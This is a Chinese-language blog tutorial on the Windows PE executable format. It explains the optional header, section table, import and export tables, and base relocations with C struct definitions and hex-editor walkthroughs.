<h5 id="SizeofOptionalHeader"><a href="#SizeofOptionalHeader" class="headerlink" title="SizeofOptionalHeader:"></a>SizeofOptionalHeader:</h5><p> 紧跟IMAGE_FILE_HEADER，表示数据的大小。在PE文件中，这个数据结构叫做IMAGE_FILE_HEADER ,其大小取决于当前文件是32位还是64位。对32位的PE文件，这个值通常是00E0h；对64位PE32+ 文件，这个值是00F0h。</p>
<p>偏移14h 就是20d 找到 E0 00</p>
<p><img src="/2021/08/28/PE%E7%BB%93%E6%9E%84/image-20210826185017047.png" alt="image-20210826185017047"></p>
<h5 id="Characteristics"><a href="#Characteristics" class="headerlink" title="Characteristics:"></a>Characteristics:</h5><p> 文件属性，有选择地通过几个值的运算得到。这些标志的有效值是定义于winnt.h内的IMAGE _FILE xx值,具体如表 所示。普通EXE文件的这个字段的值一般是010fh,DLL文件的这个字段的值一般是2102h。</p>
<p>​                                                                                                    属性字段的含义</p>
<p><img src="/2021/08/28/PE%E7%BB%93%E6%9E%84/image-20210826185935083.png" alt="image-20210826185935083"></p>
<h4 id="IMAGE-OPTIONAL-HEADER（扩展PE头）："><a href="#IMAGE-OPTIONAL-HEADER（扩展PE头）：" class="headerlink" title="IMAGE_OPTIONAL_HEADER（扩展PE头）："></a>IMAGE_OPTIONAL_HEADER（扩展PE头）：</h4><p>32位：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER</span> &#123;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  +<span class="number">18</span>h  	WORD    	Magic;						<span class="comment">//标准字。PE32: 10B PE64: 20B</span></span><br><span class="line">  +<span class="number">1</span>Ah  	BYTE    	MajorLinkerVersion;</span><br><span class="line">  +<span class="number">1B</span>h  	BYTE    	MinorLinkerVersion;</span><br><span class="line">  +<span class="number">1</span>Ch  	DWORD   	SizeOfCode;					<span class="comment">//所有含有代码的区块的大小 编译器填入 没用(可改)</span></span><br><span class="line">  +<span class="number">20</span>h  	DWORD   	SizeOfInitializedData;		<span class="comment">//所有初始化数据区块的大小 编译器填入 没用(可改)</span></span><br><span class="line">  +<span class="number">24</span>h  	DWORD   	SizeOfUninitializedData;	<span class="comment">//所有含未初始化数据区块的大小 编译器填入 没用(可改)</span></span><br><span class="line">  +<span class="number">28</span>h  	DWORD   	AddressOfEntryPoint;		<span class="comment">//程序执行入口RVA</span></span><br><span class="line">  +<span class="number">2</span>Ch  	DWORD   	BaseOfCode;					<span class="comment">//代码区块起始RVA</span></span><br><span class="line">  +<span class="number">30</span>h  	DWORD   	BaseOfData;					<span class="comment">//数据区块起始RVA</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  +<span class="number">34</span>h  	DWORD   	ImageBase;						<span class="comment">//内存镜像基址(程序默认载入基地址)</span></span><br><span class="line">  +<span class="number">38</span>h  	DWORD   	SectionAlignment; 				<span class="comment">//内存中区块对齐大小</span></span><br><span class="line">  +<span class="number">3</span>Ch  	DWORD   	FileAlignment; 					<span class="comment">//文件中区块对齐大小(提高程序运行效率)</span></span><br><span class="line">  +<span class="number">40</span>h  	WORD    	MajorOperatingSystemVersion;</span><br><span class="line">  +<span class="number">42</span>h  	WORD    	MinorOperatingSystemVersion;</span><br><span class="line">  +<span class="number">44</span>h  	WORD    	MajorImageVersion;</span><br><span class="line">  +<span class="number">46</span>h  	WORD    	MinorImageVersion;</span><br><span class="line">  +<span class="number">48</span>h  	WORD    	MajorSubsystemVersion;</span><br><span class="line">  +<span class="number">4</span>Ah  	WORD    	MinorSubsystemVersion;</span><br><span class="line">  +<span class="number">4</span>Ch  	DWORD   	Win32VersionValue;</span><br><span class="line">  +<span class="number">50</span>h  	DWORD   	SizeOfImage;					<span class="comment">//内存中整个PE文件的映射的尺寸,可比实际值大,必须是SectionAlignment的整数倍</span></span><br><span class="line">  +<span class="number">54</span>h  	DWORD   	SizeOfHeaders; 					<span class="comment">//MS-DOS头部、PE文件头、区块表总大小</span></span><br><span class="line">  +<span class="number">58</span>h  	DWORD   	CheckSum;						<span class="comment">//映像校验和,一些系统.dll文件有要求,判断是否被修改</span></span><br><span class="line">  +<span class="number">5</span>Ch  	WORD    	Subsystem;						</span><br><span class="line">  +<span class="number">5</span>Eh  	WORD    	DllCharacteristics;				<span class="comment">//文件特性,不是针对DLL文件的,16进制转换2进制可以根据属性对应的表格得到相应的属性</span></span><br><span class="line">  +<span class="number">60</span>h  	DWORD   	SizeOfStackReserve;</span><br><span class="line">  +<span class="number">64</span>h  	DWORD   	SizeOfStackCommit;				</span><br><span class="line">  +<span class="number">68</span>h  	DWORD   	SizeOfHeapReserve;</span><br><span class="line">  +<span class="number">6</span>Ch  	DWORD   	SizeOfHeapCommit;</span><br><span class="line">  +<span class="number">70</span>h  	DWORD   	LoaderFlags;</span><br><span class="line">  +<span class="number">74</span>h  	DWORD   	NumberOfRvaAndSizes;			<span class="comment">//数据目录表的项数</span></span><br><span class="line">  +<span class="number">78</span>h  				IMAGE_DATA_DIRECTORY ; 			<span class="comment">//数据目录表,结构体数组</span></span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br></pre></td></tr></table></figure>



<p>ps: </p>
<p>IMAGE_OPTIONAL_HEADER64结构有少许变化，PE32中的BaseOfData字段不纯在与PE32+中,在PE32+中Magic的值是020Bh.</p>
<p>首先根据偏移找下找下扩展PE头在哪,  18h=24d,  78h = 120 d </p>
<p>开始和结束</p>
<p><img src="/2021/08/28/PE%E7%BB%93%E6%9E%84/image-20210831221740333.png" alt="image-20210831221740333"></p>
<p>还需要知道的是，程序的真正入口点 = ImageBase + AddressOfEntryPoint</p>
<p>几个重要的字段：</p>
<p><strong>AddressOfEntryPoint</strong>（程序的入口点，免杀的最后一步）</p>
<p>程序执行入口RVA。对于dll，这个入口点在进程初始化和关闭时及线程创建和毁灭时被调用。在大多数可执行文件中，这个地址不直接指向Main、WinMain 或DllMain函数，而指向运行时的库代码并由它来调用上述函数。在DLL中，这个字段能被设置为0，链接器的 /NOENTRY开关可以设置这个字段为0。</p>
<p>验证一下</p>
<p><img src="/2021/08/28/PE%E7%BB%93%E6%9E%84/image-20210826201922104.png" alt="image-20210826201922104"></p>
<p>找到了这个和基地址，找到了内存中程序真正的入口点。</p>
<p><img src="/2021/08/28/PE%E7%BB%93%E6%9E%84/image-20210826202510754.png" alt="image-20210826202510754"></p>
<p><strong>ImageBase</strong>： </p>
<p>基址(映像的基地址)，文件在内存中的首选载入地址。如果目前没有其他文件占据这块地址，加载器会尝试在这个地址载入PE文件。如果PE文件是在这个地址载入的，那么加载器将跳过应用基址重定位的步骤。</p>
<p><strong>SectionAlignment</strong>：</p>
<p>载入内存时的区块对齐大小（节对齐）。PE中的区块被加载到内存时会按照这个字段指定的值来对齐，每个区块被载入的地址必定是本字段指定数值的整数倍。比如这个值是0x1000，那么每个区块的起始地址的低12位都是0.</p>
<p><strong>FileAlignment</strong>：</p>
<p>磁盘上PE文件内的区块对齐大小。对于x86文件来说，这个值通常是200h或1000h，这是为了保证块总是从磁盘的扇区开始。SectionAlignment必须大于或等于FileAlignment。</p>
<p><strong>Win32VersionValue</strong>：</p>
<p>一个从来不用的字段，保留，通常被设置为0。</p>
<p><strong>SizeOfImage</strong>：</p>
<p>映像载入内存的总大小（占用虚拟空间的大小），这个大小指的是从ImageBase到最后一个块的大小。最后一个块根据其大小向上取整。</p>
<p><strong>SizeOfHeaders</strong>：</p>
<p>所有文件头（包括节表）的大小，即MS_Dos头部、PE文件头、区块表的总大小。这个值是以FileAlignment对齐的。</p>
<p>需要注意的是，FileAlignment 以及 SizeOfHeaders 这两个字段，因为SizeOfHeaders是根据FileAlignment来对齐的，如果所有的头加上节表的大小是300，FileAlignment 是200，那么SizeOfHeaders的大小就为400。这种对齐虽然牺牲了空间，但是可以提高程序运行效率。需要清楚的是，PE程序在运行时内存中的对齐值和没有运行时的对齐值可能是截然不同的。</p>
<p><strong>CheckSum</strong>：</p>
<p>映像的校验和。</p>
<p><strong>DataDirectory</strong>：</p>
<p>数据目录表。由数个相同的IMAGE_DATA_DIRECTORY结构组成，指向输出表、输入表、资源块等数据。IMAGE_DATA_DIRECTORY的结构如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef struct _IMAGE_DATA_DIRECTORY &#123;</span><br><span class="line">	DWORD   VirtualAddress;  				//数据块的起始RVA</span><br><span class="line">    DWORD   Size;							//数据块的长度</span><br><span class="line">&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;</span><br></pre></td></tr></table></figure>



<p>数据目录表的成员结构：</p>
<p><img src="/2021/08/28/PE%E7%BB%93%E6%9E%84/image-20210831233739807.png" alt="image-20210831233739807"></p>
<p>对应的信息</p>
<p>PE文件信息</p>
<p><img src="/2021/08/28/PE%E7%BB%93%E6%9E%84/image-20210901001914087.png" alt="image-20210901001914087"></p>
<p>PE文件数据目录表信息</p>
<p><img src="/2021/08/28/PE%E7%BB%93%E6%9E%84/image-20210901001549342.png" alt="image-20210901001549342"></p>
<h4 id="区块（节）（Section-table）"><a href="#区块（节）（Section-table）" class="headerlink" title="区块（节）（Section table）"></a>区块（节）（Section table）</h4><p>在PE文件头和原始数据之间存在一个区块表。区块表中包含每个块在映像（内存）中的信息，分别指向不同的区块实体。</p>
<p><strong>区块表</strong>（节表）</p>
<p>大小为40字节</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_SECTION_HEADER</span> &#123;</span></span><br><span class="line">    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME]; <span class="comment">//ASCII字符串 可自定义 只截取8个字节</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span>								   <span class="comment">//该节在没有对齐之前的真实尺寸,该值可以不准确</span></span><br><span class="line">            DWORD   PhysicalAddress;</span><br><span class="line">            DWORD   VirtualSize;</span><br><span class="line">    &#125; Misc;</span><br><span class="line">    DWORD   VirtualAddress; 			   <span class="comment">//内存中的偏移地址</span></span><br><span class="line">    DWORD   SizeOfRawData;				   <span class="comment">//节在文件中对齐的尺寸</span></span><br><span class="line">    DWORD   PointerToRawData;			   <span class="comment">//节在文件中的偏移</span></span><br><span class="line">    DWORD   PointerToRelocations;		   <span class="comment">//在obj文件中使用，重定位的偏移</span></span><br><span class="line">    DWORD   PointerToLinenumbers;</span><br><span class="line">    WORD    NumberOfRelocations;</span><br><span class="line">    WORD    NumberOfLinenumbers;</span><br><span class="line">    DWORD   Characteristics;			   <span class="comment">//节的属性</span></span><br><span class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure>



<p>这里结合实例来分析一下，.test、.rdata、.data三个块的描述，每个块对应于一个IMAGE_SECTION_HEADER结构，</p>
<p><img src="/2021/08/28/PE%E7%BB%93%E6%9E%84/image-20210901003413827.png" alt="image-20210901003413827"></p>
<p>在winhex里打开看下</p>
<p>从左向右依次排序，我这就不标序号了</p>
<p><img src="/2021/08/28/PE%E7%BB%93%E6%9E%84/image-20210901005747191.png" alt="image-20210901005747191"></p>
<ol>
<li>name：块名</li>
<li>VirtualSize：实际被使用的区块的大小，进行对齐处理前区块的实际大小，这里是6000h，指的是内存中的大小。</li>
</ol>
<p><img src="/2021/08/28/PE%E7%BB%93%E6%9E%84/image-20210901010243392.png" alt="image-20210901010243392"></p>
<p>VOffset：内存中的起始位置（虚拟地址）</p>
<p>VSize：内存中的大小（虚拟大小）</p>
<p>ROffset：文件中的起始位置</p>
<p>RSize：文件中的大小</p>
<p>3.VirtualAddress：内存中的偏移地址。是按照内存页对齐的，它的数值总是SectionAlignment的整数倍。</p>
<p>4.SizeOfRawData：节（区块）在文件（磁盘）中所占的空间。在可执行文件中，该字段是已经被FileAlignment 潜规则处理过的长度。例如，指定FileAlignment的值为200h，如果VIrtualSize中的块长度为19h字节，这块应该保存的长度为200h字节。</p>
<p>5.PointerToRawData：节在文件中的偏移，这个数值是从文件头开始算起的偏移量。程序经编译或汇编后生成原始数据，这个字段用于给出原始数据在文件中的偏移。如果程序自装载PE或COFF文件（而不是由操作系统载入的），这一字段将比VirtualAddress还重要。这种情况下，必须完全使用线性映像的方法载入文件，所以需要在该偏移处找到块的数据，而不是VirtualAddress字段中的RVA地址。</p>
<ol start="10">
<li><p>Characteristic：区块的属性。该字段是按位来指出区块的属性（如代码/数据/可读/可写等）的标志。</p>
<p>​                                        </p>
<p>​                                        <strong>字段属性</strong></p>
</li>
</ol>
<table>
<thead>
<tr>
<th>IMAGE_SCN_CNT_CODE0x00000020</th>
<th>The section contains executable code.包含代码，常与 0x10000000一起设置。</th>
</tr>
</thead>
<tbody><tr>
<td>IMAGE_SCN_CNT_INITIALIZED_DATA0x00000040</td>
<td>The section contains initialized data.该区块包含以初始化的数据。</td>
</tr>
<tr>
<td>IMAGE_SCN_CNT_UNINITIALIZED_DATA0x00000080</td>
<td>The section contains uninitialized data.该区块包含未初始化的数据。</td>
</tr>
<tr>
<td>IMAGE_SCN_MEM_DISCARDABLE0x02000000</td>
<td>The section can be discarded as needed. 该区块可被丢弃，因为当它一旦被装入后， 进程就不在需要它了，典型的如重定位区块。</td>
</tr>
<tr>
<td>IMAGE_SCN_MEM_SHARED0x10000000</td>
<td>The section can be shared in memory. 该区块为共享区块。</td>
</tr>
<tr>
<td>IMAGE_SCN_MEM_EXECUTE0x20000000</td>
<td>The section can be executed as code. 该区块可以执行。通常当0x00000020被设置 时候，该标志也被设置。</td>
</tr>
<tr>
<td>IMAGE_SCN_MEM_READ0x40000000</td>
<td>The section can be read. 该区块可读，可执行文件中的区块总是设置该 标志。</td>
</tr>
<tr>
<td>IMAGE_SCN_MEM_WRITE0x80000000</td>
<td>The section can be written to. 该区块可写。</td>
</tr>
</tbody></table>
<h4 id="常见区块与区块合并"><a href="#常见区块与区块合并" class="headerlink" title="常见区块与区块合并"></a>常见区块与区块合并</h4><p>一般来说，一个PE文件会包含至少代码块和数据块两个区块，诶个区块都有特定的名字用于区别区块的用途，区块在映像中是按照RVA排列的。EXE和OBJ文件一些常见的区块表如下图</p>
<p><img src="/2021/08/28/PE%E7%BB%93%E6%9E%84/image-20210901012832517.png" alt="image-20210901012832517"></p>
<p><img src="/2021/08/28/PE%E7%BB%93%E6%9E%84/image-20210901012902813.png" alt="image-20210901012902813"></p>
<p>用户还可以自己创建和命名自己的区块，在vc++中用#pragma来声明，告诉编译器将数据插入一个区块，代码如下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg(<span class="meta-string">&quot;MY_DATA&quot;</span>)</span></span><br></pre></td></tr></table></figure>

<p>这样，vc++处理的数据都将放进一个叫MY_DATA的区块内，而不是默认的.data区块。<br>如果两个区块拥有相似或相同的属性，那么他们在链接时就能够合并成一个区块。</p>
<p>合并区块的优点是节省磁盘和内存空间。合并区块没有什么硬性规定，但是不应该把.rsrc、.reloc或.pdata合并到其他区块里。因为部分输入数据是在载入内存时由Windows加载器写入的，所以对于那些只读区块，系统会临时修改那些包含输入数据的页属性为可读可写，初始化完成后恢复成原来的属性。</p>
<h4 id="区块的对齐值"><a href="#区块的对齐值" class="headerlink" title="区块的对齐值"></a>区块的对齐值</h4><p>在PE文件头里，FileAlignment定义磁盘区块的对齐值。每一个区块从对齐值的倍数的偏移位置开始存放。而区块的实际代码或数据的大小不一定刚好是这么多，所以在多余的地方一般以00h 来填充，这就是区块间的间隙。<br>在PE文件头中，SectionAlignment定义了内存中区块的对齐值。PE 文件被映射到内存中时，区块总是至少从一个页边界开始。一般在X86 系列的CPU 中，页是按4KB（1000h）来排列的；在IA-64 上，是按8KB（2000h）来排列的。所以在X86 系统中，PE文件区块的内存对齐值一般等于 1000h，每个区块按1000h 的倍数在内存中存放。</p>
<p>有的PE文件为了减少体积，磁盘对齐值是200h。这类文件被映射到内存中后，数据相对于文件头的偏移量在内存中和磁盘文件中是不同的，这个时候就需要文件偏移地址与虚拟地址的转换问题，前文已经提到怎么转换。</p>
<p><img src="/2021/08/28/PE%E7%BB%93%E6%9E%84/image-20210901013215633.png" alt="image-20210901013215633"></p>
<p><img src="/2021/08/28/PE%E7%BB%93%E6%9E%84/image-20210901082844364.png" alt="image-20210901082844364"></p>
<p>注意到，MS-DOS头部、PE文件头和节表（区块表）的位置没有发生变化，而各个节（区块）被映射到内存中，偏移部分发生了变化，中间的空白以0填充。</p>
<h3 id="输入表（Import-Table）："><a href="#输入表（Import-Table）：" class="headerlink" title="输入表（Import Table）："></a>输入表（Import Table）：</h3><p>可执行文件使用来自其他DLL的代码或数据的动作称为输入。输入函数就是被程序调用但是执行代码又不在程序中的函数，这些函数的代码位于相关的dll文件中，在调用程序中只保留线管的函数信息（函数名、DLL文件名等）。</p>
<p>对于磁盘上的文件，它无法得知这些输入函数在内存中的子hi，只有当PE文件被装入内存后，Windows加载器才将相关DLL装入，并将调用输入函数的指令和函数实际所处的地址联系起来。这就是”动态链接“的概念。</p>
<p>动态链接是通过PE文件中定义的”输入表“来完成的，输入表中保存的正是函数名和其驻留的DLL名等。</p>
<p><strong>输入表的结构（IMAGE_IMPORT_DESCRIPTOR）</strong></p>
<p>在PE文件的IMAGE_OPTIONAL_HEADER中， 数据目录表的第二个成员指向输入表，输入表以一个IMAGE_IMPORT_DESCRIPTOR(IID)数组开始。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span></span><br><span class="line"> <span class="number">00</span>h   		<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD   Characteristics;            </span><br><span class="line">        DWORD   OriginalFirstThunk;         <span class="comment">// RVA 指向 INT (PIMAGE_THUNK_DATA结构数组)</span></span><br><span class="line">    	&#125; DUMMYUNIONNAME;</span><br><span class="line"> <span class="number">04</span>h   DWORD   TimeDateStamp;                 </span><br><span class="line"> <span class="number">08</span>h   DWORD   ForwarderChain;                </span><br><span class="line"> <span class="number">0</span>ch   DWORD   Name;							<span class="comment">//RVA指向dll名字,以0结尾</span></span><br><span class="line"> <span class="number">10</span>h   DWORD   FirstThunk;                     <span class="comment">// RVA 指向 IAT (PIMAGE_THUNK_DATA结构数组)</span></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure>

<p><strong>Characteristics</strong> 和 <strong>OriginalFirstThunk</strong>：一个联合体，如果是数组的最后一项 Characteristics 为 0，否则 OriginalFirstThunk 保存一个 RVA，指向一个 IMAGE_THUNK_DATA 的数组，这个数组中的每一项表示一个导入函数。</p>
<p> <strong>name</strong>：DLL名字的指针（RVA），指向导入模块的名字，它是一个以”00“结尾的ASCII字符的RVA地址，该字符串中包含输入的DLL名。</p>
<p><strong>FirstThunk</strong>：一个 RVA，指向输入地址表（Import_Address_Table)，IAT是一个 IMAGE_THUNK_DATA 数组。</p>
<p>很显然，OriginalFirstThunk和FirstThunk相似。他们分别指向两个本质上相同的数组IMAGE_THUNK_DATA结构。即输入名称表（Import Name Table，INT）和输入地址表（Import Address Table, IAT）.</p>
<p>下图表示PE文件加载前的情况，可执行文件正在从USER32.dll输入一些API。</p>
<p><img src="/2021/08/28/PE%E7%BB%93%E6%9E%84/image-20210901091654810.png" alt="image-20210901091654810"></p>
<p>PE文件加载后的IAT（IMPORT_ADDRESS_TABLE）：</p>
<p>此时，所有函数入口地址排列在一起，输入表中的其他部分就不重要了，程序依靠IAT提供的函数地址就可以正常运行。</p>
<p><img src="/2021/08/28/PE%E7%BB%93%E6%9E%84/image-20210902001836879.png" alt="image-20210902001836879"></p>
<p>到这才发现LordPE的用法……</p>
<p><img src="/2021/08/28/PE%E7%BB%93%E6%9E%84/image-20210901085737878.png" alt="image-20210901085737878"></p>
<p><img src="/2021/08/28/PE%E7%BB%93%E6%9E%84/image-20210901085841368.png" alt="image-20210901085841368"></p>
<p>这里再介绍两种结构：</p>
<p><strong>IMAGE_THUNK_DATA</strong>:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_THUNK_DATA32</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD 	ForwarderString;      <span class="comment">// 指向一个转向者字符串的RVA</span></span><br><span class="line">        DWORD 	Function;             <span class="comment">// 被输入的函数的内存地址</span></span><br><span class="line">        DWORD 	Ordinal;				<span class="comment">//被输入的API的序数值</span></span><br><span class="line">        DWORD 	AddressOfData;        <span class="comment">// 指向IMAGE_IMPORT_BY_NAME</span></span><br><span class="line">    &#125; ;</span><br><span class="line">&#125; IMAGE_THUNK_DATA32;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_THUNK_DATA32 * PIMAGE_THUNK_DATA32;</span><br></pre></td></tr></table></figure>

<p>当这个结构的高位为1的时候，表示该函数以序号的形式输入，这时低31位会被视作一个函数序号，当高位为0的时候，表示函数以字符串类型的函数名方式输入，这是其值是一个RVA，指向一个IMAGE_IMPORT_BY_NAME结构。</p>
<p><strong>IMAGE_IMPORT_BY_NAME</strong>：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_BY_NAME</span> &#123;</span></span><br><span class="line">    WORD    Hint; 				<span class="comment">//可能为空,编译器决定,如果不为空,是函数在导出表的索引</span></span><br><span class="line">    BYTE    Name[<span class="number">1</span>]; 			<span class="comment">//函数名称,以0结尾</span></span><br><span class="line">&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;</span><br></pre></td></tr></table></figure>

<p><strong>HInt</strong>是本函数在其所驻留的DLL中的的序号。PE装在其可以用来在DLL的输出表里快速查询函数。<br><strong>Name</strong>是函数名的ASCII字符串，实际上是一个变长结构，以NULL为结尾。</p>
<p>其实这两个结构的作用很明显，就是用来寻找当前的模块依赖哪些函数，可以用这几个函数体求到依赖函数的名字。</p>
<p>此外，除了一般的输入表，还有延时输入表，这个感兴趣的朋友可以自行去了解。</p>
<h3 id="输出表（Export-Table）："><a href="#输出表（Export-Table）：" class="headerlink" title="输出表（Export Table）："></a>输出表（Export Table）：</h3><p>exe文件中一般不存在输出表,大部分dll文件中存在输出表.</p>
<p><img src="/2021/08/28/PE%E7%BB%93%E6%9E%84/image-20210902002938013.png" alt="image-20210902002938013"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_EXPORT_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   Characteristics;			</span><br><span class="line">    DWORD   TimeDateStamp;</span><br><span class="line">    WORD    MajorVersion;</span><br><span class="line">    WORD    MinorVersion;</span><br><span class="line">    DWORD   Name;					<span class="comment">// 指针指向该导出表文件名字符串</span></span><br><span class="line">    DWORD   Base;					<span class="comment">// 导出函数起始序号</span></span><br><span class="line">    DWORD   NumberOfFunctions;		<span class="comment">// 所有导出函数的个数</span></span><br><span class="line">    DWORD   NumberOfNames;			<span class="comment">// 以函数名字导出的函数个数</span></span><br><span class="line">    DWORD   AddressOfFunctions;     <span class="comment">// 指针指向导出函数地址表RVA</span></span><br><span class="line">    DWORD   AddressOfNames;         <span class="comment">// 指针指向导出函数名称表RVA</span></span><br><span class="line">    DWORD   AddressOfNameOrdinals;  <span class="comment">// 指针指向导出函数序号表RVA</span></span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</span><br></pre></td></tr></table></figure>



<p>可以看到导出表里面最后还有三个表，这三个表可以让我们找到函数真正的地址，在编写PE格式解析器的时候可以用到，AddressOfFunctions 是函数地址表，指向每个函数真正的地址，AddressOfNames 和 AddressOfNameOrdinals 分别是函数名称表和函数序号表，我们知道DLL文件有两种调用方式，一种是用名字，一种是用序号，通过这两个表可以用来寻找函数在 AddressOfFunctions 表中真正的地址。</p>
<p>如下图是一个典型的输出表.</p>
<p><img src="/2021/08/28/PE%E7%BB%93%E6%9E%84/image-20210902003034748.png" alt="image-20210902003034748"></p>
<h4 id="基址重定位："><a href="#基址重定位：" class="headerlink" title="基址重定位："></a>基址重定位：</h4><p>这一节对研究病毒原理的影响比较大，emmm，dddd。</p>
<p>当向程序的虚拟内存加载PE文件时，文件会被加载到ImageBase所指向的地址。<br>对EXE文件来说，EXE文件会首先加载到内存，每个文件总是使用独立的虚拟地址空间，这就意味着EXE文件不用考虑基址重定位问题；</p>
<p>对于DLL文件来说，多个DLL文件使用调用其本身的宿主EXE文件的地址空间，不能保证ImageBase所指向的地址没有被其他DLL文件占用，所以DLL文件当中必须包含重定位信息</p>
<p>简单来说：</p>
<p>重定位就是你本来这个程序理论上要占据这个地址，但是由于某种原因，这个地址现在不能让你霸占，你必须转移到别的地址，这就需要基址重定位。</p>
<p>即<strong>当PE文件被装载到虚拟内存的另一个地址中的时候，也就是载入时不将默认的值作为基地址载入，链接器登记的哪个地址是错误的，需要我们用重定位表来调整</strong>。</p>
<p>总结来说，凡是涉及到直接寻址的指令都需要进行基址重定位。（凡是在机器码看到有地址的，都是直接寻址；其他的比如地址放在寄存器中，通过访问寄存器来获取地址叫间接寻址，详情参考汇编）</p>
<p>比如下面这些都是需要基址重定位的。</p>
<p><img src="/2021/08/28/PE%E7%BB%93%E6%9E%84/image-20210902135413148.png" alt="image-20210902135413148"></p>
<p>重定位的算法：将直接寻址指令中的双字地址加上模块的实际装入地址与模块建议装入地址之差。</p>
<p>进行重定位需要三个因素：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.需要修正的地址</span><br><span class="line">2.建议装入的地址</span><br><span class="line">3.实际装入的地址</span><br></pre></td></tr></table></figure>



<p>那些信息应该保存在重定位表中？</p>
<p>1.建议装入的地址在PE 文件头中已经定义了</p>
<p>2.实际装入的地址在没有被装载器装入我们根本无从得知，也就是说这事天不知地不知我们不知只有装载器知道…</p>
<p>所以，PE 文件的重定位表（Base Relocation Table）中保存的就是文件中所有需要进行重定位修正的代码的地址。</p>
<p>在PE文件中，重定位表往往单独作为一块，用“.reloc”表示。</p>
<p>重定位表有许多个，以八个字节的 0 结尾</p>
<p>找基址重定位表的方法是通过数据目录表的IMAGE_DIRECTORY_ENTRY_BASERELOC 查找。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_BASE_RELOCATION</span> &#123;</span></span><br><span class="line">    DWORD   VirtualAddress; 			<span class="comment">// 重定位数据的开始 RVA 地址</span></span><br><span class="line">    DWORD   SizeOfBlock;				<span class="comment">// 重定位块的长度</span></span><br><span class="line"><span class="comment">//  WORD    TypeOffset[1];				// 重定位项数组</span></span><br><span class="line">&#125; IMAGE_BASE_RELOCATION;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_BASE_RELOCATION UNALIGNED * PIMAGE_BASE_RELOCATION;</span><br></pre></td></tr></table></figure>



<p><strong>VirtualAddress</strong>： 是 Base Relocation Table（当前重定位结构）开始 的位置，它是一个 RVA 值；</p>
<p><strong>SizeOfBlock</strong>：是 Base Relocation Table 的大小；</p>
<p><strong>TypeOffset</strong> ：是一个数组，数组每项大小为两个字节（16位），它由高 4位和低 12位组成，高 4位代表重定位类型，低 12位是重定位地址，它与 VirtualAddress 相加即是指向PE 映像中需要修改的那个代码的地址。</p>
<p><img src="/2021/08/28/PE%E7%BB%93%E6%9E%84/image-20210902150518275.png" alt="重定位表示意图"></p>
<p>​    </p>
<p>用lordPE找一下重定位表的RVA，</p>
<p><img src="/2021/08/28/PE%E7%BB%93%E6%9E%84/image-20210902151144275.png" alt="image-20210902151144275"></p>
<p><img src="/2021/08/28/PE%E7%BB%93%E6%9E%84/image-20210902151247681.png" alt="image-20210902151247681"></p>
<p>重定位块的长度为58h，即28h有个重定位数据（58h-8h/2=28h），因为VirtualAddress和SizeOfBlock的大小都是固定的4字节，所以SizeOfBlock的值 减8 就是TypeOffSet数组的大小。</p>
<p>所以从这里开始的28h个数据都是需要被重定位的。</p>
<p><img src="/2021/08/28/PE%E7%BB%93%E6%9E%84/image-20210902153250980.png" alt="image-20210902153250980"></p>
<p>执行PE文件前，加载程序会在进行重定位的时候，会用PE文件在内存中的实际映像地址减PE文件中所要求的映像地址，根据重定位类型的不同，将差值添加到相应的地址数据中。</p>
<p>总结一下那些项目需要重定位：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.代码中使用全局变量的指令，因为全局变量一定是模块内的地址，而且使用全局变量的语句在编译后会产生一条引用全局变量基地址的指令。</span><br><span class="line"></span><br><span class="line">2.将模块函数指针赋值给变量或作为参数传递，因为赋值或传递参数是会产生mov和push指令，这些指令需要直接地址。</span><br><span class="line"></span><br><span class="line">3.C++中的构造函数和析构函数赋值虚函数表指针，虚函数表中的每一项本身就是重定位项。</span><br></pre></td></tr></table></figure>



<p>参考链接:</p>
<p><a href="https://blog.csdn.net/ski_12/article/details/80636568">https://blog.csdn.net/ski_12/article/details/80636568</a></p>
